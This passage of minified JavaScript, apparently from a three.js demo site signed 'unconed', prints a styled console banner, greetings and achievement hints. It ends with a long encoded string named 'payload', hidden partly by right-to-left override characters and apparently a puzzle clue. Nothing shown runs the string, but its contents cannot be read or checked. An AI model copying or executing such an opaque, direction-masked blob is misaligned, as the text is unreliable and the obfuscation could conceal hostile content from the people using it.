a=["▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▇█▍▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁","▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▃▇███▆▁▁▁▃▇████▍▁▁██▍▁▁▃▇█████████▇▃▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁","▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▂██▁▁▁██▍▁██▍▁▁▁▁▁▁▁██▍▄██▁▁▁▅▃▁▁▁▁▁██▍▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁","▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▄██▁▁▁▁██▍▁██▂▁▁▁▁▁▁▂██▁▁██▍▁▁██▂▁▁▁▂██▍▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁","▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▂▄▆██▁▁▁▁▁▁██▍▁▁██████████▁▁▁▁██▍▁▁███████▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁","▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁██▍▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁unconed▁▁▁▁▁▁▁",];var c="                                                                                ";bar();if(colorize()){a.forEach(function(e){var f=[];e=e.replace(/▁+/g,function(g){f.push("color: white;");f.push("color: rgb(68,105,133); background: -webkit-linear-gradient(rgb(99,199,231), rgb(68,105,133)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 3px 3px 0px rgba(0,0,0, .2), 0px 0px 20px rgba(128,190,220, 1.0);");return"%c▕"+g.substring(1)+"%c"});f.unshift(e);console.log.apply(console,f)})}else{a.forEach(function(e,f){console.log(e)})}bar();var b=["","         Greetz to mrdoob, iq, alteredqualia, p01, pyalot, flexi23,","                   aerotwist, kuvos, romancortes, jerome_etienne","                   and a basket of puppies for pouet.","",];b.forEach(function(e,f){e+=c.substring(e.length);if(colorize()){if(f<3){console.log("%c"+e.substring(0,19)+"%c"+e.substring(19),"color: rgb(83,128,162)","color: rgb(81,163,189); font-weight: bold;")}else{console.log("%c"+e,"color: rgb(83,128,162)")}}else{console.log(e)}});bar();console.log("THREE.js "+THREE.REVISION);setTimeout(function(){bar();if(colorize()){var f="background-color: #eee; padding: 2px";var e="";console.log("\nWelcome. Poke around %cgl.effects%c and %ccss3d.effects%c to see how things work. Maybe try to %cachieve%c something?",f,e,f,e,f,e)}else{console.log("\nWelcome. Poke around `gl.effects` and `css3d.effects` to see how things work. Maybe try to `achieve` something?")}},1000);if(hasAchievement("chtr")&&(+new Date()<1377676089325)){setTimeout(function(){if(colorize()){console.warn("There are %cnew clues%c inside chtr.js","font-weight:bold;","")}else{console.warn("There are new clues inside chtr.js.")}},2000)}};flair();/*!‮*/ payload = ",/‮\"&/cpihqofi/-sy py-#(x'3$`#/d'l}mf}afi%`qji. |aedtmvq$`gf|oif'oc|nn- sofivbvw}d%<,nrfhpmid!pmeJyK*beo/fYK |sdu+cij:aqfd|bkj.}o)~~e$nej}!x38<<<sdu+rbkU:2:2<0542:'214=zbrrxf#rmj[<xx.#,=fu$nwn~oh;Q{`ysc{sGicebq`ggAwdjnX=+'qez'`n9,}w k*=]U<42$;772~hu%rj6^.rz.(*8E`e&*?=2>[= |{.1klkzgeb>'ulvo_%<riu(mL`ceg8W(ugurEs euo}bk)crefr`hi,{rl'w-}'1101=~ft'kie81;:7>'nFsreg'b}ikmkh*fjAhte//|V*q%i{'g8?:23y;'b}ikmkh*-! /}9>73$944tfT['xwsl$2ubp}uf+ee`1t,30492(?9=8shz)cctBo8Y'ub`}dm#bLbofk$`sfdrnef+ofe |'om+.^%<riu(JiFn7:7=>(<67<3=302zlspwi+DkKo<y$7!0smhnfr&Y\"W:`rdkwlff!#!,|#csgdsmgi ycv/q!~/Oa~rkse/91;<:z,>62=(=?6?=7;;*2232-nshksohd dnb%n,~qjw&Y}eipu5)&y/\" x!./3*46>;8wl||uk%a~ke}nhj (\"‮ret*p8;06;)449\",,r=<65>qjw&mcWgy~5Pbejyl) }{!+$a/|M'T3gfsl`jqi{<>4>13}ev&c}jiW;S\\[Z1*uied+<<41:>30>7*>4;0ret*}t5Y(rnv/nlSfxq%nqjfZ,=RZ<riu(cvnnx4Z&kgx/rv&nvkj|`hk-sitw}.|&!%3}ev&CLid;.sz/<ymwQ`elhpq<y`r|ui$ABdg?y/1dz&~dEHB}510>;214<7%64;<(.!7$v?b`*gw}rcz</zq 87<<1*8ca+wg<Z_s.ao,jic}ffs`$``pro+`j}mbw+X6`k)ufr3>9<*57:<>!{=oo&ix}w`{3 z~-<250;*:c`'zjr?1?;=%}/ovj+lZoi!ffnqfi~c*xFe,qE|ykw(U4bnq~o'tf|3!boH{scX%0258)13>43:43?'2,u518)53;2$bbdkVgwq`u!r/:mnP(yer=?9=&>294=.ws+> u+%?\"}@rr[eICe}lBvt-%5:232 mS\\pm}~o )3?<3<.pfrg}igiMybglMu/+$m(2$lnd_niaQ,)4=0)5?>2,bnerog}cqlmwora$)18:4?\"a~r{wvrbj{x#(3;<+?37:=!`eYkgnzlawmUsmixd (979%471>3\"{rw@tlEhXdaNcnduwd,~.4vFf(ui}.+=()sit&{fcq*goks*2*2=1:>.orig|nge,hq&{le*n`Rl.q>6=<&=5>sfy%4/|#efqx`bb~dwQcUjTv 0*#shz)o8^Zx'{ <\\Y3/sv-?$dchyiC(qgu*ybf5}up`[W%phu'a~fd+pa$1dz&T5/} riG@pJPemtLsiKzm >:4=?(#pg{jEhLmuSxdqcf/32=<4'\"epnr/=*hFprkf%~gt(~dh7005;6++\"dcxiLzdBLls{,>2?8=)/ken}wBh}ks.2!|x,+,hsmQdl{tfci#<QTx!=+=5?71:508&127>*<440<X*mfkc,}*l|kkrogi..q* '2~hu%Jb645<)771<SV?vc~|wf&Im<{.1=16?&?6=>qjw&hw:[&ji{,V*l|kkrogi.t~!x'z~'cpihqofi'we/!pwarCgqmtpik{$(3ud{(xtcRTQ8>:31*>>=0&,ofa'3tc|rti*ypc^[S<x,<oje|jbj|)jd`}=QT>',w('&'`(-q)\"&>524v,. <6<;?&961=xlt}cu|FhngiwlffOudhb0>$|'aqfd|bkj&f!,sZ$('pfx(lw`o`idi::71=pQ$nrfhpmid)|t.!|Z[V*#shz)wApT`8ulsNj|bz}ehd`Dt(pgz'atm~Go4ST_YY[)xpeWk^i[*vnnoo+>%?>>1=%!*8'c*2<*/ZP8nmaa$zf~!+?) ‮wmwsmtrFdand}afiCwff`=+m} (qiy$a`~sdK;+:02?r*84;9=<pkcncogbc?nfoks,%2*\"/.!z/z1}tbs(gupqby>}nimniA0-y}\"4pa|(ugq1857>%r.nKp'`ulvw(itK'rut\"gjarefr`+k|Fgl yfh+X6drdba$zf~0&jtc|de$=!z=`y`nc)f{rq`u0,{r/<2;606cwngo%zgp3.{|\"s*wp ghlqdep`%d}g okja*Y1?2:(3905<:05<2:847(<V440)74?6S6epChl%zgp3sshoejQ}mz<1<4=>7<>6?U\\5h~g&xhss/l{/hhc|`k|n!-*><)`s('aqfd|bkj&|`s /}%612<ui'2~hu%wBcr;$020=<'!‮11=:/'=piu&clMr8-,'fuukr-rant+\">08*36:>/'*gz`sjofwv&\"‮%n}fc%phu'fi(To&,% >9469)4133+c|fjslji#a*bsh^cc$iGtaa ~0049)06<3ud{(f:'s%0sg{'o9SZ3)f.$1:0=>=*sB%1~bw)y{mpqf6^4?66*<39V?362'=07=;46)>::>i{'v_x8Y'anh|bz#l(`gf|oif//|(Gk%i{'uhs62>86ms7%3}ev&{g8%4192=*810<2zlspwi+th2z.?<4?;*63?2sit&Jejto5\\+jggsdlix-n%%B}rk# &-=QT>~gt(wP:<:40'??>>-%je&orig|nge$apke-!}4?60)302xI(fw%m~til',ueh!)-?]W20>763*36898shz)EaU:976;)11;z!#-?to}pzh&laCv%\"‮(=>>7/*<vx=$6100<>?4<=|hw(|gFq;\\W3ud{(la8\\PX[2536><<<44(2;43pgz'Rhh~>^<9>5)34;6*$412<+=35=(>90U=3:26)291>!st.>-|v,=fu$}M`YJ9Y$oldrcz/cn$epgk}njk/oM*yimpc.s}ev&~xTf;500><'?6183$>7120sg{'dt}~c9203;>*`~|cxh\"*8wl||uk%d{p~o<y!<*)?rgx)m^thb:Y)igmqhagt-`o)7:5>*=3=\"?,`gf|oif//||iq%z5$057<}dt)h~h538?3*4>2*\"&‮(kik*\",Znm}Ffmnnscdbip5a}egpoeg-ab/s\\[<Cfelga}~>-a~ke}nhj qoz-]Wt, /='-&‮*dli)\"&u`qryk&yjs,dn{_tk~!ll/['-$G`hhpFuT\\~,/gdpl'ikaskeqb&(#*!={3feocmu`dmgs8-a~ke}nhj .s:65(8<73741)37=3!xo}gdqlhe%cY/.SZu{avgo)c}he|nii*mude  |-~z\"xbjme&32?;=*091>*bxmjsdI*8(=192>sfy%odB:7=6?%2331dz&bmkg~796593~nkah|>ulsSmebg~p,`gf|oif//|\"nvkj|`hk-k'`ihu.~fz+fj`k{i57501(1>1~,!!2qdw'@Qjmm:_*%$)uu:(%^U*+>?6>W3Jkoagnq|<&221<25;5&802=|hw(kd}n;\\ymwLg|lusdk'(1<>2( |u\"(_[&05=2[3tcs^an`f}}<367%45;<qez'e{9[(p`u MRdcl+gjvl 3RZ>sfy%k{t}9W)ejt,kz%c}he|nii\"{Jc s;?31)96?2qfv(b@LPb;(3o$pgz'o}Xc>2118n`kb7%`|idpahf+U~a\" ~lie}jci~&ajmqt!'>2:07'??=3umqvh*lMOR`3z/<nmodp5<75>z'acef~-3umqvh*opferahh/cl/nlq |'%qjw&-:43:2&;==ocsj,~ZT%=qkz#h4%>76>180(916?SZ3}ev&k4bmrU|htfmm+\"hkan`sbf`h}t +\"‮ mqje~`jf.g$oMMhp/tdze,~4<06'070u. \"?rgx)n}cj5*???>)* 3&-,x<fvPX'iv}smy?359'==>53%wODiM8}ey'wdqpe$4jtRY'zjr?2:10s/uzpl_&lRcd}n/kjnfh|a+sepl`t,bd`c&Y;}chd(qd3+fibcdO~+<.wg+kLvb.yglirhgd(X7nrmcy'wdq072?)60:<1920=#t'lis(skw*zbs)l)ma%ujs&x%[;(Co+vep*mnx~gpm1229.8Cga~q`'ydp)%[9OLc||a&xhs(d$2 nh[//'`qyk'Y%W8MKsnop'zjr$rTer*<!jk!|\"5pj)zhq>X\\030:)02813\"y&ak+?/aN}~hlk{{Wpf.|-8dLw`)ufr\"(3}ev&kjmacpmjci~5d`}Ijol`qnhcgs/ml.3bb,'kjmacpmjci~!q`}}{i*/19=(>5223bejvBhe`qikofFrto}r`{3<42+7<65#(<mn/)cewGialmpcebhs\"ag*#‮fw%bF;R/|y!+ldgqkogq&dil~**;03<%%>0=5+)jw/`%Y36=?0*59>>fsjd<pfx(sjs5R6416V>396)0=23)n&=|hw(n`~:Y)pas-l|J+uj}\">7<74*=53}ev&c\\5Y(efv/bnu)o}gdqlhe-~JhBy.s8=7?1dz&azwpqa567=;'35=<=02>)>=1<znpqtd)bzvp~l=z#\",,ut)l`|.psg{'sqcte6625:2sit&]Fw~7%:<8<2qdw'x8bfdrimi|%gvck}`Mjcebhs\"/pf{ays\"*-‮sg{'nt`rqX926?'4?2,'.)-==33$\"&<'w%0-`|idpahf#LsTn%Kk/s%Yse*8shz)CiP:)C'`Elj~%3}ev&Ie8 }{!z//#3p+zzj:\"*fhmolqbimi|x+#&!!nmztnb( !+,t*xVi,j|tbz'ue~'[`&?/><2&6412*jhg+vgahskjd%Z;ac'viq3jakjjl=/u<cpx(mw||lu>X\\0541*:au(yer=>8<&75;?}.s~+kfa}dkpa'hdf/ua|kam*[;Sesgm&zfp<?::=$3+aR<7>0+4m~$zf~+&?[21+<5?:\\;fnx#wh~2bpws06?;)03943V70?3R8edi(ugqq!r}~%m)oiLll!ihm|df~b,,% .(!(bt9 *#+.gm~'Adsn-/&-%-lhk+revlha(tg~'$:c(qd\"&.*/‮>=61)4<<< py-=(gky$,'<oa\")gjj}dbkq)ijbp.|riu(O`9.q.ab`ajhtq|js\"3:>>3+?:6*.Aqmned,>&@Nn#(pgz'Vfm(h't!2plkcdr=0>443qiy$pdhzmI;.s c|arTxkarrvt,?$jDW|mp*v-?$ey^d~|f|-%1*dsZbs)%crefr`hi$lbmhbq.#rwmwsmtrFdand}afiCwff`{p'aqfd|bkj&ZKn /} |{.wd!>i{'lo:T+``ksaz/Lo(bsdjqaih sK#s!fdiS`'>qjw&zhj5%*0062:'0:0=zbrrxf#vfpg<x,<#~{ <qez'|clJ7V+kih|foiy Ga%;>7<+?:0/2qfv(}Zl|9$cM'3uc|Sojogvq!n|ifqndk. |5296&966=()c}he|nii*xnq!!r12<1vEtlZldCB!`Z&=nff}kcfs(eelz+hxybkaDcljm/t-3z$9446#2xmjum|bhi}n`g|'eja~%dvybi`Koag`,u%#‮~gt(owUza>69>0-*,(!,. z530?s\"`rgde)Cdai/hhc|`k|n!-*>zvx=t./-3qiy$mssmc5qofcip%\"‮-o}gdqlhe-d |qez'kb]uw7+$WRa*z//#\",>i{'@cZ8U}unjo)nykiEbhwKibm<pfx(\\bl|@ci`(!06>6*?*v*!+?) ‮-nshksohd sm%|xMw,|}dt)}v`5/sv-y/\" /'=qaibh}&bamMbkqKbvrlibv  dde`!&V!W.`}iescgm- s}up`<&60>2<[ob|B`hc7~lfbi)ab~Agil3~nkah|+alsN`db5eqhj1t,',[S-).%\"55<1$<''-$>phu'q]: p#6==lc:3</=!Nixo [gd&Wjb`fu.z.? a}egpoeg-kbTq+GO_b*~i{'g@~r]v40?2?<~jv$||s8*lvrZ*%1}maln`i`az\"-/2qfv(Ubd973:1>~gt(htnmamde5hdmlb}`klis?~fz+ubgm4rahbgp=pcfgj~&{n58%}dt)wjp5b~jh,qcgagq(y4/%1~bw),4apkdlig/n`!|* %.r`+> }{!<$T*~bw){snu8[)qoU%c,H)Aj&?pk{%lj}fN:QU8*#(‮'ijk+/))qfv(X`jwl;bhv`.!/,oc%\"‮'frT'sdu+igjq:X*nT)`e&|hw(Ahls}MSO!/&!2%'>qjw&tc9S0>2*32>%-s{/U<10:>83?='43=<)l`R'qez'q~$o&|hw(j;SZuY{(epgk}njk'~o. |\\YuI*0ret*~ijq`r:]2812+9:;+Lkabko}~+)0298(60<9X3][3*??<88shz)lbb:T+ogcb|Ga }w`*}eg`|!<37:&7>i{'rS:T+``ic,c`o'bqhi}lgh.ph.q*uqmyjw`\"rK$2021?<znuqcy}DfokisohdNqddm2qdw'glR4%-nj*0)31?<>zcr}uh'faW>t!2/cpihqofi/q!| mqje~`jf.b$~m{a/Qkyb.~sfy%m`aK9%6;<4y/\" >~gt(ocM|A>chdzb>'#e%phu's()c,al$1$1>7?u...1*Sce+<lc/glu}\\wi|/Wcewn#T*\"$b7j<jH}D'#' na8Xcdua<nb nl69[nkzm(zz(&Y`o|Jaem){y%&Tbc}Nchm/'!‮rgx)hXHsk:$u*~bw)dhds%wmWu+-(-!|~jv$|zqni;]<061$9:7%%8456Z0-}t.<)?482?=><8>~gt(dvcck>^$<966)%dc$T<0<04386=71>5>5(:1=qkz#Gxn4X+n{-|yle$dxomg/1<=:3(922<|iq%a}c:Z+jju.Kva(nrfhpmid!vdNo!|+6>88shz)jbv}}J;$11=3*0;50=xlq}th(jatp~L>t!2qdw'So;;2653umqvh*VbmrGkoob|mn`g|!na,<v`jzb|vms}yj$Odolforq(,.ws+/&3fw%c6-}t.<&kpnVpk&|hw(jgkq;*9904}.)qdw'IqS)ni&3z3v?0?99+=7>3/}z#32<<?'014<&20<3<riu(bvUca^Wz;.s eibdj\"3/Jigbi-Jad`$Sxo/$.&$ &)/wvgo{ 0/Ff~,\\`pljegz.+ ag 2,D&Vk~jj}'eb\"Vymnw.$.nwhwj\"<.Gik,Ebc~|$}b zik)M|saapbin.z,>%fv{hf%?~fz+u^;Q!~u/*{brNd|fwie+ajd~hcgs)fgcq'Egme%6:62&320&%:489T<2208>$)qfv(rcqupd*e%~gt(Io'Zmk%i{'ot_+vv!iK&3qiy$o;Q+po$*%4??2$!%i{'`sfg8efitkdbnb`c(%^U[= |{.1?65>3+ui'<T+chdo,y]$mqje~`jf.ix.}/qu*>!st.>'Xxoh{`df(qiy$cc~Hf`oc~bkbd|#+3+%>(43752qfv(}yOee;QT>;400)>6=3q`}}{i%vOdg2z.? |u\"?rgx)qn;Y&jgw\"c/c|fjslji#hL%l.~fz+rtcyA8 }{!<.af`q`gg/|dr|w |65?7&:=5{#!,3460?=qkz#\\5zbqLi`tfk?;493*30>2wmrszi&^|3~,2~hu%!#6csgdsmgi b`+,‮dz&na:$'|iq%nm}Ffmnnscdbip5pae`kqjxCH$,'.}qkz#w{5!|\"`ssu|admu}mj,>)3;?0u/=lhergmmq2Ijlj>qjw&Jvi9 |/Rus~dX`cnmQq!=>=-09>% ltlmnroR`i\\_z`bp!0$6:??$ ~}~ovH[j}H\"=PX*.fq|b`nSrcodaiQeivBr-217<='544+,@p}S`#24893*?<?)/omN <*==0=t!2%!'<:10>)24?<~jv$e\\4Z&c~|bhc\"zq)Jyg.>61?2=fu$G}ejVj;U'hiv.kQ*af`q`gg/cu~R)q}.|5961%2421dz&n|Ow:liovl3RZ>wbptg'op@v3v-?$E%nep&(asii|jjg(D~qnlh-/r\\Zyr}(}ev&Lxk(v$3/`rdkwlff!r,~/mphjsnkf/e_|(o&ol]a/s%Dwe*~,!!t.-,<$/&‮'kkd'\"$$cc~Hf`oc~bkbd|>Znm}Ffmnnscdbip3\\U0&k~eFaoMk(qgu*mude(5%>ddclcbjafs{6hmu~&/05?1*,(1~bw)L}o8-|,dvBbEs`j\\{~C|}{``!<:726$>6<%/xejjkBi\\y =)07<=(#onb\"2$ul%* }lapay`mo 144=4)5<1$,p@lXgrmq_^ <\\W$$Klnpcsuv|mwjlneq`rdn#<(+x!=7>55)=90>+pohPgaln$2qfv(um6,!haP\\N!2%db$yhge\"++\"gl~Tq.=*61??'#}dddflqp]uk|sfz/3/~x.'\"lnosgzpimo}QLZ\"2.}u.{.1;:2?&?44>5>=4'?<[&bihl,B~a)nshksohd *~$;:3>'vxg&fu$mqig$dI(2'kv]o~K`fi!>i{'c86352'7?=3%*0var{k(`=u.=%n`zsp*2qdw'cdJxt:[&ji{,vc&opferahh/xku|N!r%'>5<=2'27<3%E}cfh{+>~gt(aLnZMt81:06+3>=>bfdrimi|0var{k(`LaWCp1u*>;9>?+528>4<52?~fz+[lgya8`gu`/! !ag,&\"‮%%sfy%qaRNpi'}{go$1!~u/,'<pfx(O\\4ST<-~z\">4?3?*0090,{#2sit&`fuool>i`{}\\uhs#Znhto+\"sfniqeem/'/['-/7&u8kgnc'kwr`t2457&><91??29=5hhnm&uk~8'bI+|,|}blu{+cu igbpgho)ods bernmq+V5~I_|m+wg<4=??%0-y=zxips~(itr~mq><>84>508=+4wvhprp+vep1ed~tc|iOso{x,Hxqd`)vj@.ghnpki}m(\\JxgE.Jsthy&\\8nj|'wdq01>>6*?U\\3\"y06;??/|b| }/7~og)zhq>X\\0,{r/<2<19&?-{>=<0+</q!|\"5[I|ykJ%wf}/)2na,`f{ca`/q<=04(913<|iq%fphs8'!{ph+<hva`aeeh.Uad{n*ac)-‮FbK2?<47/(\"*,‮qfv(cZnf9]W#*3{cdtc'cn+$VolsLakn%zu'&[ob|B`hc\" ,s][3qgu*``t4:030>/px/2%%?gualmjgf!ll),!z}/1*D@,Wnf^'<\"x}!-(-3zmgwa&co-dou|\\vj~ ja&\"‮qdw'j87:35*>?:!+-[#ragesebhs1~bw)kXd87?21=funcaiig,tk~!\"jlq~ /.%\"*5%u2fn'ews}bu??5;%4=2;2||ohaahN7p`n)zhq>3087+r.Rvfb ekmrigpn*hd/cdlfw'W4OjA'ydp2.z <!v?^n})kzsrmu=%oi'69?'75726qhljbrmn`hEpcm)wip&et$<WS>_a)uds<37>'233;|!#jko~jk}`*xh.~H|qjz&V:ki'ydp2Z\\?:2?:?-{(+?/PLr}R}{pWjeqfjMoK,~.4objlm(yer=:911=0:64<#ux-4xf'wdq!*=!|z-3%-etCfkdKb$=ubjtosdwfe/~q~{`<.nibg $a|r0`a(9&/Snf~T$v)ffs%d'}dj`c'ekoanrakogq/<!Qhs'iim%mg)e`qsnw&}ofj(s`jp#*ilk|ct2stro$~*#‮RZ/*.0sg{'CP5*99=?pk{%xa;}ibblam`m3t<041;>7:73?'-(x]lmzhh(,&''+5bnE%Xzo<'''mphjsnkf'xfp,p#rwmrszi&pcfgj~&Vv-s.v>phu'm\\dlli9]Cgcaho|~*48?-410%%qcic$T-(?ob|Jgloo`ech|:jfi~,/+*#(>ddclcbjafs{6`qkgp>u=piu&hOzjj|l4/~\"dejv.= Qba~k\"j}+Ei,Pp``i &/paxd ?\"Tl`pirh,YwbabgZ-nb*Gga!@fy//\"kb~q\"? Ihk~mmf Ebmaue.x!=.sz/<|iq%h5R/~x.V>>=<%j*<~jv$jyf8S+?03>+(B+d{!Z%)-|v,[2%TF&S~$rgx)kqukpp&`~~!>+*2qdw'iBvapl9W)nbhpcx!d$`sfdrnef+mY|qt,|}dt)cns]:1:42(<173uc|Nhsozude38774<}dt)tV9<?9;*011$79?23ucszm%zY2z,>\\V>phu'o5X&hkjrk`k{.g$\\[.1dbf5nbqDdclcbjafs5T [.l|kkrogi.nn!x-ru <715:+615<&*<*qgid(2*\"&‮(kik*\",%{m}rwk'/-om.(.‮/n~jgrcfk vTg.}%wd!>!n|ifqndk.qv(oaAW-}|hw(ECg:]/qu*)8>=4+=>8)$h#a$nrfhpmid)iiep .}/qu*x(2++(77>6[2%`/en*0=271+'3pgz'r:Q%12;=%\\X)6<<?%/|y!Z3:020$16?=3:0>);9:>i{'q}v6Z(onkpmu HAk*l|kkrogi.a`xl,r%<660<}dt)~n99?<8?)7<823tc|rti*qj>t!2/~x.0sg{'r``til9[(ifk|goft.DOg/(=;1?,x.#,=RZz- .\"$?y/1&/*qn*-)<{nbbRMoT-2;.0=.,#a #uz_[W4tngaSB`[ ;5\":8..\"qji!T/vbi`SNb|W\":5#>4'-/.ws+)cg!tklfkij)X9yffOo}&xhs3$8^`||i*8,t3z~bas`%h{rsaz<mxhe`1+'5uocrl*zbs2*+|,K]i)IAi igbpgho)bi.zbrkcn-Z4)uds<)$%e}nm*<UP?pselhaRrmt=.w=;0'=:2?\"Nll~]iq#s/5aBm~*{d~=5112*1UX> u0542=,i!r/:ng'zjr.)#\"\"er!U/$+%!‮,bb` $/!*dtcltelm,%}$#y/,T$!‮ ``e- \" ymp\"z\"0,&)//m 1,|\"()/r-bkoitd/uq*=;/jmp.*{ms.j/> <7/k.3/o8.g*%),t)y*&=/_vpglj\"g|lb@hm~Lmjj'r-mf`|CcklL~%i&,\\\"&3-Y$.i&4&&8/}9,qiy{r`/u:-\"!, 3&-X^-$>blkbpm'bj`i}R@n~W 56,3:,/‮~hu%jnom;8>?1&4:=.+/!.h|![3/`rdkwlff!nktocp*aui~y$s-pk{%dvrn;2<04+98?<7229+3<3<&{'n~jgrcfk(ac|Feocmu`dmgs-,|&21?5zYan.y&?Odolforq<x%}(ud{(Q}j]E+s_ev'riu({s$fz(,*{/ .=2?<0>i{'q|oCw;V)b||bfo,kCx`j}b*auWba_Qw 3+Dwf8a`k~'qez'd}wnD4Y*ip{'pfx(tpnke:20?>Ad/tdzT%j)?)?9;332706(1>98<==8<sdu+rFmrk5\\0346(>:1U=]U<02;88-ru <sdu+Hoc:\\&aAr+ret*{ubO~m'Eh*~bw)yhds8[)hex}}mdET)V $&;7<0(9?*\\W$.1<11+^X+&<581+_UZ3okgsglk|(dgc<QU8-ru <sdu+KTH:X*nndav.}pJbsi$asii|jjg  |(2480=fu$Efatk;<;2>=.sz/<|iq%clfbw80>222331:)08=?to}pzh&bcibx3~,2 rz,>qjw&|:X*khfemhy!rqIl}h*6>:6,2<0?4+4<2=xfdr5fkcmapod`fr;W#Y/l}mf}afi-lc\"~phu'uyqqb9)>2;=3pgz'wbBbe8R:0?7+0>=*8061$%X+ret*Cqg;+:111l\\!)$1854)*>6?>+%$~fz+n9]Wz'U=2<1(?:>8(00?5>1224(140?~fz+IpMzF8S73?0(08$gjj}dbkq)ijbp+iqdkU0&Eqf.'3$&~ft'kcgls(p%>^Z0sg{'rhqa5T*~oz!tmNln+KsAxL,2ST<sdu+fGN:X*efx#qhl%c}he|nii\"x*~==?5+140sg{'bip:SV?bgfz`3tc|rti*mn}2u <*/'‮%jfk'.'',/,mb#2x!),hbic)*2dhds+sdVr{nic5a}egpoeg-!}$(asii|jjg(oa-,|W'axrOX*z{)?rgx)_luq5%&qkz#dj``bs`jnkr)y'riu(Hea;?1<0chD%=uo|vwg(+apkdlig'/ml.(pXj&*{`|stf'gdbafsleliqv\\ba[2[iy*<~jv$a4-s!p{hebmjya]lsnOda`vj.=Fgch$,|u~pqJ/<$$d$+-fRg.2+'cpihqofi'~d_|#-uo}QakcgrrzfS!).`kohkLjns{qvlncfEh#<QT)/aJJdck-2:3>:t.>1784(114?*Gch&?+287:=piu&qr^ql4 r g}ufwr.=57>?&:0<*-dl`clCban}ljfkff`\"?2?47'55(/sloTotp.?%00;7* s|{wgzpuCOwb_g\\K#218?=*4><)/th\\Em 0%50=0t.>2?81=<74=3dgewkjo2sit&LjbI7W-vfz}E|-`~)`|idpahf#bsbk%u~cjym/|((ud{(}d%bPAR)qfv(we9qhnlcahclq9'|iq%m|khrj:W'Z+fkRi%3}ev&}Sgea; |{.1<;5=&122>qjw&aicUpb5>1<5$10;=tmvsby|Bk`ehsljiMwgdb<vms}yj$ndmTpc=u.=%(3ud{(`Qp8X%wcmrda CeoJ(`gf|oif/`+F!x=;<'1>(3?432/|y!< mqje~`jf.d]o/|((epgk}njk'n]. |*3;1uWXsND+x!./3645=&3503fw%ia8+;5>533<;3*6<:>zcr}uh'db8x%8 <015=+4<2<y3vihr*reZqzoho:`rdkwlff!(/‮%c',&.|_U<*iios*dz&ves&`k*8wl||uk%%mphjsnkf' b`-&qUk(&piu&f*5#bl|Zsjwfl`..fdlab~niah~z\"!=Zf'&qkz#dj``bs`jnkr2[i$(nn+,%gQ`aU& .'.fi`j`mdbkq'6%alsFg`nm}aicd}-ab/!.&|Vf#%)(h\\laZ+8&`c<Xf[f+$$&ylq[rizfab\"/bfaalq`hbequ.+'e!<Te$$&*nwgqj |Zi*(#%)(}~u`=+\"gjona~benjp!&Uk(&&('&sopw?)/Hdmlb}`klis$]iddgocn5gz8:{sthdo=\"\"(hdmlb}`klis$#'/7+wrxfko8!$[h'*(#%)kliq`u1%r{rb(Ti(+$$&*m`dg2'bbfiz)Uf)'%%z\">Zg''yTiu)?y=|hw(t3yv;X$m{qlfm/q|oCw*|R.?~fz+pa~{4cijum<pfx(Usap456<20sg{'cqejqlap;mlqIenabpbgmmq2*WS'>qjw&jmnJc:S#y/&gd~oaisiuW3!:oS+<17>?>phu'c5\\SVY?+>>48=0?16<U&fdj`!dolI`)`|idpahf#na/q>7?>(=07<\"nvkj|`hk-fZmU%rkue~$Yv|d#r7040&>>6w!+,29=53+220=fu$owAGe9+=928=1852)315>{m}rwk'luOEf<y!<;=20(;>43pgz'r:U&ndy n+cpihqofi/lq}z\"078=+<233%t%1 epgk}njk/dil |23;7&8<y/\" >*|`,Ct;{P!>i{'rsS}i;+l%?Ainbjmrs2wmrszi&p|\\ui2u <sdu+asdj~9id`barcglk|u=1?141 xx 3mhfpjnkr'eh`q<::=5(??73pgz'j}fmjp4?=4<+49==mbka|b(|mjbe~+W\"Y3<pfx(`8R=:12X<)j$21370)?33?]W2sit&Eh`u}5X39;<)423'01;5+&Z%U0)252>>*9e*<Y)oi`m!k%apkdlig/q@rLk\"rgx)nxu~a:]\\W$+~t!%>540''FpIr$~fz+carKjmacpmjci~(V'T3zbqLi`tfk?**0ret*xdYbp5\\$gr}!X2*+<(44>6=V)beko `tw~c%c}he|nii\"pwZ!r\\X>qjw&kDSr5sz~a?$bvU$=zbrrxf#gJ\\<x,<~kblanjmc3}ev&lcnf~o5X(jkx+thYmq)crefr`hi,fN$Eqeog%m$p/s>21$8;12~hu%r:2<1=<23;63yapsxg%={!<pfx({8RU2plkcdr=fu$gh5)$rgx)tiep(yc'l}mf}afi%inxq. |rjlbnbjabwyuapF*<32;88wl||uk%hd>{ <%$~fz+`rW7jjfuidbnIN{ahd)qdw']sbe:*=>00K&?pk{%J@mjek:U&ndy Dhcwp'csgdsmgi Rovigf)lepY.}/((epgk}njk'xaw~j/-srfoabodlauj*.=qkz#n}Og:-~ ivpd]l#2%lUwikc)sit&qis:>?23'<>?'+,!3554<)8?1(!iv}uoambyay\"3STz,>5?46'4463/sv-?+>04==piu&j7 x\"nksatHpe\"<+'aqfd|bkj&zdq /}SZ{`(epgk}njk'dIgd/-s2=;=*021x\"$*/kBk{monjpdj\"?\\V)!mbtwy~/15<7=%\"}vi/=+>2;;x 3171<<)-$21308<~jv$g~oyw;W)uhx|A|!c}@k)a~ke}nhj 